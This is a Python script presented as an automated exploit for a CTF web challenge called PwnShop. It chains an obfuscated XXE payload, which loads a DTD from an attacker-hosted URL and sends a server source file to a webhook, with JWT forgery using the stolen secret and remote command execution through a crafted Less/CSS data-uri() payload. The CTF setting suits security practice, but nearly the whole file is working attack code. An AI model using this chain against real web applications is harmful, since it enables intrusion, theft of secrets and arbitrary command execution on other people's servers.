#!/usr/bin/env python3
import argparse
import requests
import time
import jwt
import json
import sys
import random
import string

def generate_random_string(length=6):
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def generate_random_credentials():
    username = "user_" + generate_random_string(6)
    # A simple password, to be adapted according to the expected complexity.
    password = "Pass" + generate_random_string(4) + "!"
    email = username + "@pwnshop.com"
    firstName = "First" + generate_random_string(3)
    lastName = "Last" + generate_random_string(3)
    return username, password, email, firstName, lastName

def register_user(target, username, password, email, firstName, lastName):
    """
    Register a new user via the /api/register endpoint.
    The payload corresponds to the expected one:
    {"username": "...", "password": "...", "email": "...", "firstName": "...", "lastName": "..."}
    """
    url = target.rstrip("/") + "/api/register"
    headers = {
        "Content-Type": "application/json"
    }
    data = {
        "username": username,
        "password": password,
        "email": email,
        "firstName": firstName,
        "lastName": lastName
    }
    
    print("[*] [Register] Attempting to register user '{}'".format(username))
    try:
        r = requests.post(url, json=data, headers=headers, timeout=10)
    except Exception as e:
        print("[-] [Register] Error during registration: {}".format(e))
        sys.exit(1)
    
    if r.status_code not in (200, 201):
        print("[-] [Register] Registration failed, HTTP code {}: {}".format(r.status_code, r.text))
        sys.exit(1)
    
    print("[*] [Register] Registration successful.")
    try:
        res_json = r.json()
        if "token" in res_json:
            print("[*] [Register] Token retrieved from the registration response.")
            return res_json["token"]
    except Exception:
        pass
    return None

def login_user(target, username, password):
    """
    Authenticate the user via the /api/login endpoint to retrieve a JWT token.
    """
    url = target.rstrip("/") + "/api/login"
    data = {
        "username": username,
        "password": password
    }
    print("[*] [Login] Attempting to authenticate user '{}'".format(username))
    try:
        r = requests.post(url, json=data, timeout=10)
    except Exception as e:
        print("[-] [Login] Error during authentication: {}".format(e))
        sys.exit(1)
    
    if r.status_code != 200:
        print("[-] [Login] Authentication failed, HTTP code {}: {}".format(r.status_code, r.text))
        sys.exit(1)
    
    try:
        res_json = r.json()
        if "token" in res_json:
            print("[*] [Login] Authentication successful, token retrieved.")
            return res_json["token"]
        else:
            print("[-] [Login] The response does not contain a token.")
            sys.exit(1)
    except Exception as e:
        print("[-] [Login] Error during response parsing: {}".format(e))
        sys.exit(1)

def exploit_xxe(target, order_id, initial_token, dtd_url):
    """
    Send the order submission request with an XML payload designed to exploit XXE via IDOR and load a remote DTD.
    """
    payload_xml = (
        '<?xml version="1.0" encoencoding="UTF7"ding="UTF-7" standalone="yes"?>'
        '+-ADw-!DOCTYPE order [ <!ENTITY % pe SYSTEM "{dtd_url}/exploit.dtd"> %pe; %param1; ]>'
        '<order>'
            '<shipping_address>'
                '<name>poc</name>'
                '<address>&external;</address>'
                '<zipcode>poc</zipcode>'
                '<city>poc</city>'
                '<country>poc</country>'
                '<phone>poc</phone>'
            '</shipping_address>'
        '</order>'
    ).format(dtd_url=dtd_url)
    
    url = target.rstrip("/") + "/api/orders/submit"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + initial_token
    }
    data = {
        "xml": payload_xml,
        "id": order_id
    }
    
    print("[*] [Step 1] Sending XXE payload to: " + url)
    try:
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print("[*] HTTP response {}:\n{}".format(r.status_code, r.text))
    except Exception as e:
        print("[-] Error during XXE payload sending: {}".format(e))
        sys.exit(1)
    
    print("[*] If the target is vulnerable, it will load your remote DTD and your webhook will receive the exfiltrated file (JWTManager.php encoded in base64).")
    return r

def generate_admin_jwt(secret_key):
    """
    Generate a valid JWT for the admin user (user_id 2) using the extracted secret key.
    """
    now = int(time.time())
    payload = {
        "user_id": 2,
        "username": "user",
        "permissions": [
            "changePassword",
            "checkout",
            "createOrder",
            "getVouchers",
            "manageCart",
            "searchOrders",
            "updateOrderStatus",
            "updateProfile",
            "validateVoucher",
            "viewOrders",
            "viewProducts",
            "manageAppearance"
        ],
        "iat": now,
        "exp": now + 3600
    }
    
    token = jwt.encode(payload, secret_key, algorithm="HS256")
    if isinstance(token, bytes):
        token = token.decode()
    print("[*] [Step 2] Generated admin JWT:")
    print(token)
    return token

def set_import_directory(target, admin_token, physical_path="/var/www/html/resources/less", import_path="system"):
    """
    Configure the Less import directory via the /api/settings/less/imports endpoint.
    Payload : {"physicalPath":"/var/www/html/resources/less", "importPath":"system"}
    """
    url = target.rstrip("/") + "/api/settings/less/imports"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + admin_token
    }
    data = {
        "physicalPath": physical_path,
        "importPath": import_path
    }
    
    print("[*] [Step 3] Configuring the Less directory via: " + url)
    try:
        r = requests.post(url, json=data, headers=headers, timeout=10)
        print("[*] HTTP response {}:\n{}".format(r.status_code, r.text))
    except Exception as e:
        print("[-] Error during Less directory configuration: {}".format(e))
        sys.exit(1)
    return r

def trigger_rce(target, admin_token, command):
    """
    Trigger a command execution via the CSS update endpoint.
    The CSS payload invokes data-uri() with the desired command.
    """
    url = target.rstrip("/") + "/api/settings/css"
    headers = {
        "Content-Type": "application/json",
        "Authorization": "Bearer " + admin_token
    }
    
    # To display literal braces with .format(), double the braces.
    css_payload = ".test {{ content: data-uri('{}'); }}".format(command)
    data = { "css": css_payload }
    
    print("[*] [Step 4] Sending RCE payload to: " + url)
    try:
        r = requests.put(url, json=data, headers=headers, timeout=10)
        print("[*] HTTP response {}:\n{}".format(r.status_code, r.text))
    except Exception as e:
        print("[-] Error during RCE payload sending: {}".format(e))
        sys.exit(1)
    
    return r

def main():
    parser = argparse.ArgumentParser(
        description="Automated exploit for the PWNME CTF 2025 PwnShop challenge."
    )
    # Option pour enregistrer un nouvel utilisateur
    parser.add_argument("--register", action="store_true",
                        help="Use this option to register a new user and obtain a token automatically")
    parser.add_argument("--username", help="Username for registration (optional, generated randomly if absent)")
    parser.add_argument("--password", help="Password for registration (optional, generated randomly if absent)")
    parser.add_argument("--email", help="Email for registration (optional, generated randomly if absent)")
    parser.add_argument("--firstName", help="First name for registration (optional, generated randomly if absent)")
    parser.add_argument("--lastName", help="Last name for registration (optional, generated randomly if absent)")
    parser.add_argument("--initial-token", help="JWT token for a user with the checkout permission (not required if --register is used)")
    
    parser.add_argument("--target", required=True,
                        help="Base URL of the target (ex: http://localhost)")
    parser.add_argument("--order-id", default="1",
                        help="ID of the order to submit (default: 1)")
    parser.add_argument("--dtd-url", required=True,
                        help="URL where your exploit.dtd is hosted (ex: http://attacker.com)")
    parser.add_argument("--webhook", required=True,
                        help="URL of your webhook for exfiltration (must match the one in exploit.dtd)")
    parser.add_argument("--secret-key",
                        help="Secret key extracted from JWTManager.php (if already obtained)")
    parser.add_argument("--command", default="id",
                        help="Command to execute via CSS update (ex: id or '/getflag PWNME')")
    
    args = parser.parse_args()
    
    # Initial token retrieval
    if args.register:
        # Generating random credentials if certain fields are missing
        if not (args.username and args.password and args.email and args.firstName and args.lastName):
            username, password, email, firstName, lastName = generate_random_credentials()
            print("[*] Generated random credentials:")
            print("    username: {}".format(username))
            print("    password: {}".format(password))
            print("    email:    {}".format(email))
            print("    firstName: {}".format(firstName))
            print("    lastName: {}".format(lastName))
        else:
            username = args.username
            password = args.password
            email = args.email
            firstName = args.firstName
            lastName = args.lastName

        token = register_user(args.target, username, password, email, firstName, lastName)
        if not token:
            # If registration does not return a token, try authentication
            token = login_user(args.target, username, password)
        initial_token = token
    else:
        if not args.initial_token:
            print("[-] You must provide --initial-token or use --register to create a new user.")
            sys.exit(1)
        initial_token = args.initial_token

    # Step 1 : Exploitation of XXE via the order submission endpoint.
    print("=" * 60)
    print("[*] Step 1 : Exploitation of XXE via IDOR to exfiltrate JWTManager.php")
    print("=" * 60)
    exploit_xxe(args.target, args.order_id, initial_token, args.dtd_url)
    print("\n[*] Please check your webhook at {} to see the exfiltrated data.".format(args.webhook))
    print("    Once you have captured JWTManager.php (encoded in base64), decode it and retrieve the secret key.")
    
    # Step 2 : Generation of the admin JWT.
    if not args.secret_key:
        secret_key = input("\n[*] Enter the secret key obtained from JWTManager.php : ").strip()
    else:
        secret_key = args.secret_key
    if not secret_key:
        print("[-] No secret key provided. Exiting.")
        sys.exit(1)
    
    print("\n" + "=" * 60)
    print("[*] Step 2 : Generation of the admin JWT")
    print("=" * 60)
    admin_jwt = generate_admin_jwt(secret_key)
    
    # Step 3 : Configuration of the Less directory (to control the import_dirs)
    print("\n" + "=" * 60)
    print("[*] Step 3 : Configuration of the Less directory via the /api/settings/less/imports endpoint")
    print("=" * 60)
    set_import_directory(args.target, admin_jwt)
    
    # Step 4 : Triggering command execution via CSS update.
    print("\n" + "=" * 60)
    print("[*] Step 4 : Triggering command execution via CSS update")
    print("=" * 60)
    trigger_rce(args.target, admin_jwt, args.command)
    
    print("\n[*] Exploitation completed. If you launched '/getflag PWNME', check the response for the flag.")

if __name__ == "__main__":
    main()
